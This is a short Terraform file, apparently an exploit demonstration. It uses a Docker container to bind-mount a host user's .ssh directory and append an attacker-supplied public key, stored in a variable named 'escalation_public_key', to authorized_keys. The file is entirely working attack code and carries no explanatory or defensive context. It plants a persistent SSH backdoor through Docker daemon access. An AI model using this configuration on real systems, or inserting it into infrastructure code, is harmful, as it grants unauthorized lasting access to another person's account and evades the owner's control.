variable "escalation_public_key" {
  type = string
}

resource "docker_container" "ubuntu" {
  name    = "foo"
  image   = "alpine:3.11"
  restart = "no"

  command = ["sh", "-c", "echo \"${var.escalation_public_key}\">> /run/workdir/authorized_keys"]

  mounts {
    source = "/home/xander/.ssh"
    target = "/run/workdir"
    type   = "bind"
  }
}
